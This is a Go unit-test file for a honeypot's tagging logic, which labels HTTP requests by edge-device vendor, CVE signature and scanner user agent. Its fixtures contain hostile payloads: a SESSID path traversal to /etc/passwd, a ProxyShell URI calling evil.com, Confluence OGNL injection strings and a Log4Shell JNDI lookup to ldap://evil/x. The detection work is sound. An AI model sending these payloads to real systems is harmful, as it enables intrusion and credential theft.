package honeypot

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// fixture builds a test request with the given method + URI plus optional
// header overrides. For Cookie / Connection / Host overrides we set them
// after httptest.NewRequest so they're not stripped by the helper.
func fixture(method, uri string, headers map[string]string) *http.Request {
	r := httptest.NewRequest(method, uri, nil)
	for k, v := range headers {
		if k == "Host" {
			r.Host = v
			continue
		}
		r.Header.Set(k, v)
	}
	return r
}

func hasTag(tags []string, want string) bool {
	for _, t := range tags {
		if t == want {
			return true
		}
	}
	return false
}

func TestTagsForRequest_VendorPresence(t *testing.T) {
	cases := []struct {
		name string
		uri  string
		want string
	}{
		{"globalprotect login", "/global-protect/login.esp", "edge-device:globalprotect"},
		{"globalprotect hipreport", "/ssl-vpn/hipreport.esp", "edge-device:globalprotect"},
		{"panos mgmt rce path", "/php/utils/createremoteappwebsession.php", "edge-device:panos-mgmt"},
		{"fortinet remote login", "/remote/login", "edge-device:fortinet"},
		{"fortinet 21762 path", "/remote/hostcheck_validate", "edge-device:fortinet"},
		{"ivanti dana-na", "/dana-na/auth/url_default/welcome.cgi", "edge-device:ivanti"},
		{"ivanti 46805 traversal sink", "/api/v1/totp/user-backup-code/foo", "edge-device:ivanti"},
		{"cisco-asa cscoe", "/+CSCOE+/logon.html", "edge-device:cisco-asa"},
		{"cisco-asa cscou", "/+CSCOU+/scripts/", "edge-device:cisco-asa"},
		{"citrix vpn", "/vpn/index.html", "edge-device:citrix"},
		{"citrix shitrix", "/vpns/cfg/smb.conf", "edge-device:citrix"},
		{"exchange owa", "/owa/auth/logon.aspx", "edge-device:exchange"},
		{"exchange autodiscover", "/autodiscover/autodiscover.json", "edge-device:exchange"},
		{"sonicwall sslvpnclient", "/sslvpnclient", "edge-device:sonicwall"},
		{"f5 tmui login", "/tmui/login.jsp", "edge-device:f5-bigip"},
		{"f5 mgmt bash", "/mgmt/tm/util/bash", "edge-device:f5-bigip"},
		{"vcenter rce ova", "/ui/vropspluginui/rest/services/uploadova", "edge-device:vcenter"},
		{"confluence dologin", "/dologin.action", "edge-device:confluence"},
		{"confluence 22515 step1", "/server-info.action?setupcomplete=false", "edge-device:confluence"},
		{"jira serverinfo", "/rest/api/2/serverinfo", "edge-device:jira"},
		{"spring actuator env", "/actuator/env", "appserver:spring-actuator"},
		{"jolokia list", "/jolokia/list", "appserver:jolokia"},
		{"tomcat manager", "/manager/html", "appserver:tomcat"},
		{"hnap1 dlink", "/HNAP1/", "edge-device:soho-router"},
		{"gpon iot", "/GponForm/diag_Form?images/", "edge-device:soho-router"},
		{"realtek ud probe", "/UD/?5", "edge-device:soho-router"},
		{"hisilicon dvr", "/web/cgi-bin/hi3510/param.cgi", "edge-device:iot-camera"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := fixture(http.MethodGet, tc.uri, nil)
			tags := tagsForRequest(r, nil)
			if !hasTag(tags, tc.want) {
				t.Fatalf("uri %q: missing tag %q in %v", tc.uri, tc.want, tags)
			}
		})
	}
}

func TestTagsForRequest_CompositeCveSignals(t *testing.T) {
	t.Run("CVE-2024-3400 globalprotect SESSID traversal", func(t *testing.T) {
		r := fixture(http.MethodPost, "/ssl-vpn/hipreport.esp",
			map[string]string{"Cookie": "SESSID=/../../../etc/passwd"})
		tags := tagsForRequest(r, nil)
		if !hasTag(tags, "cve:CVE-2024-3400") {
			t.Fatalf("expected cve:CVE-2024-3400, got %v", tags)
		}
	})

	t.Run("CVE-2024-3400 negative — clean SESSID", func(t *testing.T) {
		r := fixture(http.MethodPost, "/global-protect/login.esp",
			map[string]string{"Cookie": "SESSID=abc123"})
		tags := tagsForRequest(r, nil)
		if hasTag(tags, "cve:CVE-2024-3400") {
			t.Fatalf("did not expect cve:CVE-2024-3400 for clean cookie, got %v", tags)
		}
	})

	t.Run("CVE-2023-4966 Citrix Bleed oversized Host", func(t *testing.T) {
		bigHost := strings.Repeat("a", 20*1024)
		r := fixture(http.MethodGet, "/oauth/idp/.well-known/openid-configuration",
			map[string]string{"Host": bigHost})
		tags := tagsForRequest(r, nil)
		if !hasTag(tags, "cve:CVE-2023-4966") {
			t.Fatalf("expected cve:CVE-2023-4966 (Host len %d), got %v", len(bigHost), tags)
		}
		// Vendor tag rides along when the CVE composite fires —
		// /oauth/idp/ alone is too generic to attribute, but oversized
		// Host on it is unambiguous Citrix Bleed.
		if !hasTag(tags, "edge-device:citrix") {
			t.Fatalf("citrix bleed should also tag edge-device:citrix, got %v", tags)
		}
	})

	t.Run("CVE-2023-4966 negative — normal Host on /oauth/idp/", func(t *testing.T) {
		r := fixture(http.MethodGet, "/oauth/idp/.well-known/openid-configuration",
			map[string]string{"Host": "ns.example.com"})
		tags := tagsForRequest(r, nil)
		if hasTag(tags, "cve:CVE-2023-4966") || hasTag(tags, "edge-device:citrix") {
			t.Fatalf("legit OIDC discovery should not attribute citrix, got %v", tags)
		}
	})

	t.Run("CVE-2023-46747 F5 BIG-IP request smuggling", func(t *testing.T) {
		r := fixture(http.MethodPost, "/mgmt/tm/auth/user", nil)
		r.Header.Set("Connection", "X-F5-Auth-Token, keep-alive")
		tags := tagsForRequest(r, nil)
		if !hasTag(tags, "cve:CVE-2023-46747") {
			t.Fatalf("expected cve:CVE-2023-46747, got %v", tags)
		}
	})

	t.Run("ProxyShell @ marker", func(t *testing.T) {
		r := fixture(http.MethodPost, "/autodiscover/autodiscover.json?@evil.com/mapi/nspi/", nil)
		tags := tagsForRequest(r, nil)
		if !hasTag(tags, "cve:CVE-2021-34473") {
			t.Fatalf("expected cve:CVE-2021-34473 (proxyshell), got %v", tags)
		}
	})

	t.Run("Confluence OGNL ${ marker", func(t *testing.T) {
		r := fixture(http.MethodGet, "/${@org.apache.struts2.ServletActionContext@getResponse()}/", nil)
		tags := tagsForRequest(r, nil)
		if !hasTag(tags, "cve:CVE-2022-26134") {
			t.Fatalf("expected cve:CVE-2022-26134, got %v", tags)
		}
	})

	t.Run("Confluence OGNL URL-encoded marker", func(t *testing.T) {
		r := fixture(http.MethodGet, "/$%7B@evil%7D/", nil)
		tags := tagsForRequest(r, nil)
		if !hasTag(tags, "cve:CVE-2022-26134") {
			t.Fatalf("expected cve:CVE-2022-26134 for encoded form, got %v", tags)
		}
	})

	t.Run("Log4Shell jndi in header", func(t *testing.T) {
		r := fixture(http.MethodGet, "/", map[string]string{
			"X-Forwarded-For": "${jndi:ldap://evil/x}",
		})
		tags := tagsForRequest(r, nil)
		if !hasTag(tags, "log4shell") || !hasTag(tags, "cve:CVE-2021-44228") {
			t.Fatalf("expected log4shell + cve:CVE-2021-44228, got %v", tags)
		}
	})
}

func TestTagsForRequest_ScannerUA(t *testing.T) {
	cases := []struct {
		ua  string
		tag string
	}{
		{"Mozilla/5.0 (compatible; Censys-Compliance-Surveyor)", "scanner:censys"},
		{"Mozilla/5.0 (compatible; internet-measurement.com)", "scanner:censys"},
		{"Shodan-Inspector/1.0", "scanner:shodan"},
		{"Mozilla/5.0 zgrab/0.x", "scanner:mass"},
		{"masscan/1.3", "scanner:mass"},
		{"GreyNoise-Research", "scanner:greynoise"},
		{"Shadowserver Foundation Survey", "scanner:shadowserver"},
	}
	for _, tc := range cases {
		t.Run(tc.tag, func(t *testing.T) {
			r := fixture(http.MethodGet, "/", map[string]string{"User-Agent": tc.ua})
			tags := tagsForRequest(r, nil)
			if !hasTag(tags, tc.tag) {
				t.Fatalf("UA %q: expected %q in %v", tc.ua, tc.tag, tags)
			}
		})
	}
}

// Regression guard: paths we deliberately *un*-attributed because they
// were too generic to assign to a specific vendor (the user flagged
// /php/login.php during review). Each of these, on its own, must NOT
// produce an edge-device:* tag — we'd rather miss attribution than
// claim it falsely in research output.
func TestTagsForRequest_GenericPathsAreNotAttributed(t *testing.T) {
	cases := []struct {
		uri         string
		mustNotHave string
	}{
		{"/php/login.php", "edge-device:panos-mgmt"},
		{"/login.action", "edge-device:confluence"},
		{"/sdk", "edge-device:vcenter"},
		{"/folder/list", "edge-device:esxi"},
		{"/p/login/", "edge-device:fortimanager"},
		{"/oauth/idp/.well-known/openid-configuration", "edge-device:citrix"},
	}
	for _, tc := range cases {
		t.Run(tc.uri, func(t *testing.T) {
			r := fixture(http.MethodGet, tc.uri, nil)
			tags := tagsForRequest(r, nil)
			if hasTag(tags, tc.mustNotHave) {
				t.Fatalf("uri %q must not attribute %q, got %v", tc.uri, tc.mustNotHave, tags)
			}
		})
	}
}

func TestTagsForRequest_BaselineHttp(t *testing.T) {
	r := fixture(http.MethodGet, "/", nil)
	tags := tagsForRequest(r, nil)
	if !hasTag(tags, "http") {
		t.Fatalf("expected baseline http tag, got %v", tags)
	}
	// Baseline GET should not light up any CVE/edge-device tag.
	for _, t2 := range tags {
		if strings.HasPrefix(t2, "edge-device:") || strings.HasPrefix(t2, "cve:") {
			t.Fatalf("baseline GET / should have no vendor/CVE tag, got %v", tags)
		}
	}
}
